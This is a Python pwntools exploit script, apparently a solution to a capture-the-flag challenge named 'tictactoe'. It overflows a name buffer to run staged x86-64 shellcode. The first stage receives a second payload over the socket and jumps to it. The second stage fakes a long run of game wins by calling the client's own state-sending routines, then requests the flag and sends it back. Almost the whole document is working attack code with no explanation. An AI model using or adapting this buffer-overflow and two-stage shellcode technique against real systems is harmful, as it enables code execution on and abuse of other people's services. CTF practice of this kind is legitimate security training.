#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

pop_rdi                 = 0x40310b
pop_rsi_r15             = 0x403109
pop_rbp_r12_r13_r14_r15 = 0x403103
csu                     = 0x4030e3
ret                     = 0x401016

main_got                = 0x4051e0

recv_all                = 0x402ff5
send_all                = 0x402f87
send_message            = 0x401768
psock                   = 0x405720
server_ip               = 0x405728
session                 = 0x405740
send_state              = 0x402a74
send_reg_user           = 0x402835
send_get_flag           = 0x402ce1

name = 0x405770

LOCAL = True

if LOCAL:
    f = process('./tictactoe_patched')
    p = remote('localhost', 8889)
else:
    p = remote('pwn-tictactoe.ctfz.one', 8889)

sc = asm('''
    mov rdi, ''' + hex(0x1010101010101010 + psock) + 
    '''
    mov rbx, 0x1010101010101010
    sub rdi, rbx
    mov rdi, [rdi]
    push 0x7f
    pop rax
    push 0x10
    pop r8
    mul r8
    mov rdx, rax
    mov rsi, ''' + hex(0x1010101010101010 + 0x405800) +
    '''
    sub rsi, rbx
    mov rcx, ''' + hex(0x1010101010101010 + recv_all) + 
    '''
    sub rcx, rbx
    call rcx
    jmp rsi
    ''')

payload = sc.ljust(0x58, b'\x90') + p64(name)
p.sendlineafter(': ', payload)

sc = asm('''
    mov rdi, ''' + hex(0x1010101010101010 + server_ip) + 
    '''
    sub rdi, rbx
    mov rdi, [rdi]
    mov rsi, ''' + hex(0x1010101010101010 + session) + 
    '''
    sub rsi, rbx
    mov rax, ''' + hex(0x1010101010101010 + send_reg_user) + 
    '''
    sub rax, rbx
    call rax
    
    mov rax, ''' + hex(0x1010101010101010 + name) + 
    '''
    sub rax, rbx
    xor rcx, rcx
    mov [rax], rcx

WIN:
    mov rdi, ''' + hex(0x1010101010101010 + server_ip) + 
    '''
    sub rdi, rbx
    mov rdi, [rdi]
    mov rsi, ''' + hex(0x1010101010101010 + session) + 
    '''
    sub rsi, rbx
    xor rdx, rdx
    push 0x4
    pop rcx
    mov rax, ''' + hex(0x1010101010101010 + send_state) + 
    '''
    sub rax, rbx
    call rax

    mov rdi, ''' + hex(0x1010101010101010 + server_ip) + 
    '''
    sub rdi, rbx
    mov rdi, [rdi]
    mov rsi, ''' + hex(0x1010101010101010 + session) + 
    '''
    sub rsi, rbx
    push 0x8
    pop rdx
    push 0x3
    pop rcx
    mov rax, ''' + hex(0x1010101010101010 + send_state) + 
    '''
    sub rax, rbx
    call rax

    mov rdi, ''' + hex(0x1010101010101010 + server_ip) + 
    '''
    sub rdi, rbx
    mov rdi, [rdi]
    mov rsi, ''' + hex(0x1010101010101010 + session) + 
    '''
    sub rsi, rbx
    push 0x7
    pop rdx
    push 0x5
    pop rcx
    mov rax, ''' + hex(0x1010101010101010 + send_state) + 
    '''
    sub rax, rbx
    call rax
    
    mov rax, ''' + hex(0x1010101010101010 + name) + 
    '''
    sub rax, rbx
    mov r8, [rax]
    push 1
    pop r9
    add r8, r9
    mov [rax], r8
    push 0x7f
    pop r9
    cmp r8, r9
    jle WIN
    
    mov rdi, ''' + hex(0x1010101010101010 + server_ip) + 
    '''
    sub rdi, rbx
    mov rdi, [rdi]
    mov rsi, ''' + hex(0x1010101010101010 + session) + 
    '''
    sub rsi, rbx
    mov rdx, ''' + hex(0x1010101010101010 + name) +
    '''
    sub rdx, rbx
    mov rax, ''' + hex(0x1010101010101010 + send_get_flag) + 
    '''
    sub rax, rbx
    call rax

    mov rdi, ''' + hex(0x1010101010101010 + psock) + 
    '''
    sub rdi, rbx
    mov rdi, [rdi]
    mov rsi, ''' + hex(0x1010101010101010 + name) + 
    '''
    sub rsi, rbx
    push 0x7f
    pop rdx
    mov rax, ''' + hex(0x1010101010101010 + send_all) + 
    '''
    sub rax, rbx
    call rax
    ''')
payload = sc
sleep(20)
p.sendline(payload)

p.interactive()
